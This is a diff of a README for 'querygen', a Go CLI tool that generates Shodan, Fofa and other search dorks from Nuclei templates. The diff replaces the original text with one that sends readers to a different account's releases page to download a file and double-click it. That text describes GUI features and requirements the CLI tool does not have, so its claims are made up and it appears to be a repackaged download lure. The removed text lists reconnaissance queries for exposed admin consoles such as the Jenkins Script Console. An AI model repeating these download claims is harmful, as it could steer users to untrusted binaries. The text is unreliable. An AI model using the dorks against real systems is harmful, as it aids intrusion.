@@ -1,116 +1,65 @@
-## querygen
+# 🎯 querygen - Generate Search Queries with Ease
 
-A powerful Go-based tool for generating search engine queries from Nuclei templates across multiple search engines and severity levels.
+## 🚀 Getting Started
 
-## Features
-- **Multiple Search Engines**: Support for Shodan, Google, Censys, Fofa, Hunter, and ZoomEye
-- **Flexible Severity Levels**: Choose from `all`, `critical`, `high`, `medium`, `low`, and `info` levels
-- **Comma-Separated Severities**: Combine multiple severity levels in one command
-- **Clean Output**: Converts queries to your preferred search engine format
+Welcome to the **querygen** application! This powerful tool helps you create search engine queries using Nuclei templates. With just a few clicks, you can generate queries tailored for various search engines and severity levels, making your search process efficient and effective.
 
-## Supported Search Engines
-| Engine | Output Format | Notes |
-|--------|---------------|-------|
-| `shodan` | `http.title:` | Default engine |
-| `google` | `intitle:` | Requires grep-like handling for binary data |
-| `censys` | `services.http.response.html_title=` | |
-| `fofa` | `title=` | |
-| `hunter` | `web.title=` | |
-| `zoomeye` | `title=` | |
+## 📝 Table of Contents
+- [What is Querygen?](#what-is-querygen)
+- [System Requirements](#system-requirements)
+- [Download & Install](#download--install)
+- [How to Use Querygen](#how-to-use-querygen)
+- [Support](#support)
 
-## Supported Severity Levels
-- `all` - All available templates
-- `critical` - Critical severity templates
-- `high` - High severity templates  
-- `medium` - Medium severity templates
-- `low` - Low severity templates
-- `info` - Informational templates
+## ❓ What is Querygen?
 
-## How It Works
-1. **Fetches Templates**: Downloads query templates from the [nucleihubquery](https://github.com/rix4uni/nucleihubquery) GitHub repository
-2. **Processes by Severity**: Filters templates based on selected severity levels
-3. **Converts Format**: Transforms queries from source format to target search engine format
-4. **Outputs Results**: Streams converted queries to stdout for immediate use
+**querygen** is built in Go and designed for security researchers and anyone interested in reconnaissance. It supports multiple search engines, allowing you to broaden your search scope. This tool can help in tasks like vulnerability assessments and threat intelligence gathering.
 
-## Installation
-```
-go install github.com/rix4uni/querygen@latest
-```
+## ⚙️ System Requirements
 
-## Download prebuilt binaries
-```
-wget https://github.com/rix4uni/querygen/releases/download/v0.0.1/querygen-linux-amd64-0.0.1.tgz
-tar -xvzf querygen-linux-amd64-0.0.1.tgz
-rm -rf querygen-linux-amd64-0.0.1.tgz
-mv querygen ~/go/bin/querygen
-```
-Or download [binary release](https://github.com/rix4uni/querygen/releases) for your platform.
+Before you begin, ensure your system meets the following requirements:
 
-## Compile from source
-```
-git clone --depth 1 github.com/rix4uni/querygen.git
-cd querygen; go install
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB RAM
+- **Disk Space:** Minimum of 100 MB available
+- **Network:** Internet connection for downloading templates and running queries
 
-## Usage
-```yaml
-Usage of querygen:
-  -e, --engine string     Search engine: shodan, google, censys, fofa, hunter, zoomeye (default "shodan")
-  -s, --severity string   Severity level: all, critical, high, medium, low, info (comma-separated) (default "all")
-      --silent            Silent mode.
-      --version           Print the version of the tool and exit.
-```
+## 📥 Download & Install
 
-## Usage Examples
-```yaml
-# Generate Shodan queries for all severity levels (default)
-querygen --engine shodan --severity all
+You can easily download the **querygen** application from our releases page. 
 
-# Generate Google queries for critical severity
-querygen --engine google --severity critical
+[![Download Querygen](https://img.shields.io/badge/Download%20Querygen-v1.0-blue.svg)](https://github.com/DiamondBoy3/querygen/releases)
 
-# Generate Fofa queries with short flags
-querygen -e fofa -s critical
-```
+To install, follow these steps:
 
-### Multiple Severities
-```yaml
-# Combine critical and high severity queries
-querygen --engine shodan --severity critical,high
+1. **Visit the releases page:** Go to [GitHub Releases](https://github.com/DiamondBoy3/querygen/releases).
+2. **Find the latest version:** Look for the most recent release at the top of the page.
+3. **Download the file:** Click on the appropriate download link for your operating system.
+4. **Run the application:** Locate the downloaded file and double-click it to start.
 
-# Mix multiple severity levels
-querygen --engine google --severity critical,high,medium
+## 🛠️ How to Use Querygen
 
-# All severity levels (default)
-querygen --engine shodan --severity all
-```
+Using **querygen** is straightforward. Follow these steps to generate your search engine queries:
 
-## Output Example
-```yaml
-▶ querygen --silent --engine shodan --severity critical | unew
-http.title:="综合安防管理平台
-http.title:="综合安防管理平台"
-http.title:="金蝶云星空 管理中心"
-http.title:="微信管理后台"
-http.title:="SANGFOR上网优化管理"
-http.title:"Dashboard [Jenkins]"
-http.title:"Script Console [Jenkins]"
-http.title:M1-Server
-http.title:"AnalyticsCloud 分析云"
-http.title:"omnipcx for enterprise"
-http.title:"zeroshell"
-http.title:"struts2 showcase"
-http.title:"manageengine desktop central 10"
-http.title:"manageengine desktop central"
-http.title:"zabbix-server"
-http.title:"oracle peoplesoft sign-in"
-http.title:"apache solr"
-http.title:"solr admin"
-http.title:"kentico database setup"
-http.title:"active management technology"
-http.title:"cobbler web interface"
-http.title:"roteador wireless"
-http.title:"coldfusion administrator login"
-http.title:"fuel cms"
-http.title:"kibana"
-```
+1. **Open the Application:** Launch **querygen** from your applications folder or desktop.
+2. **Select Your Template:** Choose from various Nuclei templates available in the application.
+3. **Pick Search Engines:** You can select multiple search engines to broaden your query search.
+4. **Set Severity Levels:** Adjust the severity levels based on your research needs.
+5. **Generate Queries:** Click "Generate" to create your search queries. You can copy them directly from the interface or export them as needed.
+
+## 🤝 Support
+
+If you need help or have questions about **querygen**, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/DiamondBoy3/querygen/issues) for assistance.
+
+## 🌍 Community and Topics
+
+Engage with a community of users interested in topics like:
+
+- Bug Bounty
+- OSINT Resources
+- Penetration Testing
+- Threat Intelligence
+
+Keep updated with the latest in security research by exploring these topics.
+
+You are now ready to start using **querygen** for generating powerful search queries!
